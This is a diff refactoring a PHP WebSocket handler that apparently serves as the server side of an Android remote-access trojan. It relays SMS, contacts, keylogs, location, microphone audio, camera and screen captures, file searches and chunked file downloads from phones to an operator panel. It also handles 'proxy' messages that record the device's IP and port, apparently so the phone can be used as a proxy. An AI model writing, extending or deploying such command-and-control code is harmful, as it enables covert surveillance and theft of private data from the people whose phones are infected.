@@ -5,9 +5,11 @@ declare(strict_types=1);
 namespace App\WebSocket\Handlers;
 
 use App\WebSocket\ConnectionManager;
+use App\WebSocket\Messages\WebSocketMessage;
 use App\WebSocket\Services\DeviceStatusService;
 use App\WebSocket\Services\HeartbeatService;
 use App\WebSocket\Services\LastPingFormatter;
+use App\WebSocket\Services\PanelNotificationService;
 use App\WebSocket\WebSocketLog;
 
 final class DeviceHandler
@@ -15,12 +17,13 @@ final class DeviceHandler
     public function __construct(
         private readonly ConnectionManager $connectionManager,
         private readonly HeartbeatService $heartbeatService,
-        private readonly DeviceStatusService $deviceStatusService
+        private readonly DeviceStatusService $deviceStatusService,
+        private readonly PanelNotificationService $panelNotificationService,
     ) {}
 
-    public function handle(int $fd, array $data): void
+    public function handle(int $fd, WebSocketMessage $message): void
     {
-        $phoneId = $data['pid'] ?? null;
+        $phoneId = $message->pid();
 
         if ($phoneId === null) {
             WebSocketLog::getLogger()->warning("Device message missing pid: fd={$fd}");
@@ -33,23 +36,23 @@ final class DeviceHandler
             $this->connectionManager->registerDevice($fd, $phoneId);
         }
 
-        $subc = $data['subc'] ?? null;
+        $subc = $message->subc();
 
         if ($subc === 'ping') {
-            $this->handlePing($phoneId, $data);
+            $this->handlePing($phoneId, $message);
 
             return;
         }
 
-        $this->forwardToPanel($phoneId, $data);
+        $this->forwardToPanel($phoneId, $message);
     }
 
-    private function handlePing(string $phoneId, array $data): void
+    private function handlePing(string $phoneId, WebSocketMessage $message): void
     {
         try {
             $this->heartbeatService->recordPing($phoneId);
 
-            $encodedData = $data['msg'] ?? '';
+            $encodedData = $message->getString('msg');
             $status = $this->deviceStatusService->updateFromPing($phoneId, $encodedData);
 
             $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);
@@ -62,7 +65,7 @@ final class DeviceHandler
                 'lastPing' => $lastPing,
                 'phoneInfo' => $phoneInfo,
             ]);
-            $this->connectionManager->notifyPanelUsersDeviceStatusUpdate($phoneId, $phoneInfo);
+            $this->panelNotificationService->notifyDeviceStatusUpdate($phoneId, $phoneInfo);
         } catch (\Throwable $e) {
             WebSocketLog::getLogger()->error('Ping handling failed, connection preserved', [
                 'phone_id' => $phoneId,
@@ -71,86 +74,86 @@ final class DeviceHandler
         }
     }
 
-    private function forwardToPanel(string $phoneId, array $data): void
+    private function forwardToPanel(string $phoneId, WebSocketMessage $message): void
     {
-        $subc = $data['subc'] ?? 'unknown';
+        $subc = $message->subc() ?? 'unknown';
 
         $panelData = match ($subc) {
             // Standard msg-based messages
             'sms', 'chat', 'files', 'savefiles', 'snap', 'loc', 'loadapps', 'loadcontacts', 'injapps' => [
                 'type' => $subc,
-                'data' => $data['msg'] ?? '',
+                'data' => $message->getString('msg'),
                 'pid' => $phoneId,
             ],
 
             // klogs → type "klog" (note: different type name)
             'klogs' => [
                 'type' => 'klog',
-                'data' => $data['msg'] ?? '',
+                'data' => $message->getString('msg'),
                 'pid' => $phoneId,
             ],
 
             // klogsdate
             'klogsdate' => [
                 'type' => 'klogsdate',
-                'data' => $data['msg'] ?? '',
+                'data' => $message->getString('msg'),
                 'pid' => $phoneId,
             ],
 
             // thumb - adds path field
             'thumb' => [
                 'type' => 'thumb',
-                'data' => $data['msg'] ?? '',
+                'data' => $message->getString('msg'),
                 'pid' => $phoneId,
-                'path' => $data['pth'] ?? 'null',
+                'path' => $message->getString('pth', 'null'),
             ],
 
             // mic - uses voip field instead of msg
             'mic' => [
                 'type' => 'mic',
-                'data' => $data['voip'] ?? '',
+                'data' => $message->getString('voip'),
                 'pid' => $phoneId,
             ],
 
             // screen/screenshot - uses img field, adds dimensions
             'screen', 'screenshot' => [
                 'type' => $subc,
-                'data' => $data['img'] ?? '',
+                'data' => $message->getString('img'),
                 'pid' => $phoneId,
-                'wmob' => $data['wmob'] ?? '',
-                'hmob' => $data['hmob'] ?? '',
+                'wmob' => $message->getString('wmob'),
+                'hmob' => $message->getString('hmob'),
             ],
 
             // cam - uses img field
             'cam' => [
                 'type' => 'cam',
-                'data' => $data['img'] ?? '',
+                'data' => $message->getString('img'),
                 'pid' => $phoneId,
             ],
 
             // srch - uses pths field, adds sfor
             'srch' => [
                 'type' => 'srch',
-                'data' => $data['pths'] ?? 'null',
+                'data' => $message->getString('pths', 'null'),
                 'pid' => $phoneId,
-                'sfor' => $data['stype'] ?? 'null',
+                'sfor' => $message->getString('stype', 'null'),
             ],
 
             // down - file download with chunking
             'down' => [
                 'type' => 'down',
-                'filename' => $data['filename'] ?? '',
-                'filedata' => $data['filedata'] ?? '',
-                'totalSize' => $data['totalSize'] ?? 0,
-                'sentSize' => $data['sentSize'] ?? 0,
-                'chunkNumber' => $data['chunkNumber'] ?? 0,
-                'filehash' => $data['filehash'] ?? '',
-                'filepath' => $data['filepath'] ?? '',
+                'filename' => $message->getString('filename'),
+                'filedata' => $message->getString('filedata'),
+                'totalSize' => $message->get('totalSize', 0),
+                'sentSize' => $message->get('sentSize', 0),
+                'chunkNumber' => $message->get('chunkNumber', 0),
+                'filehash' => $message->getString('filehash'),
+                'filepath' => $message->getString('filepath'),
                 'pid' => $phoneId,
             ],
 
             // proxy - complex ctype-based logic
-            'proxy' => $this->buildProxyPanelData($phoneId, $data),
+            'proxy' => $this->buildProxyPanelData($phoneId, $message),
 
             // Default fallback
             default => [
@@ -162,9 +165,9 @@ final class DeviceHandler
         $this->connectionManager->sendToPanels($phoneId, $panelData);
     }
 
-    private function buildProxyPanelData(string $phoneId, array $data): array
+    private function buildProxyPanelData(string $phoneId, WebSocketMessage $message): array
     {
-        $ctype = $data['ctype'] ?? '';
+        $ctype = $message->getString('ctype');
 
         return match ($ctype) {
             'first' => [
@@ -172,23 +175,23 @@ final class DeviceHandler
                 'pid' => $phoneId,
                 'calltype' => 'first',
                 'extip' => $this->connectionManager->getClientIp($phoneId) ?? '',
-                'locip' => $data['loip'] ?? '',
-                'pxport' => $data['pport'] ?? '',
+                'locip' => $message->getString('loip'),
+                'pxport' => $message->getString('pport'),
             ],
             'state' => [
                 'type' => 'proxy',
                 'pid' => $phoneId,
                 'calltype' => 'state',
-                'pstate' => $data['pxstate'] ?? '',
+                'pstate' => $message->getString('pxstate'),
             ],
             'dataup' => [
                 'type' => 'proxy',
                 'pid' => $phoneId,
                 'calltype' => 'dataup',
-                'ogip' => $data['oip'] ?? '',
+                'ogip' => $message->getString('oip'),
                 'pxip' => $this->connectionManager->getClientIp($phoneId) ?? '',
-                'purl' => $data['purl'] ?? '',
-                'pmthod' => $data['pmth'] ?? '',
+                'purl' => $message->getString('purl'),
+                'pmthod' => $message->getString('pmth'),
             ],
             default => [
                 'type' => 'proxy',
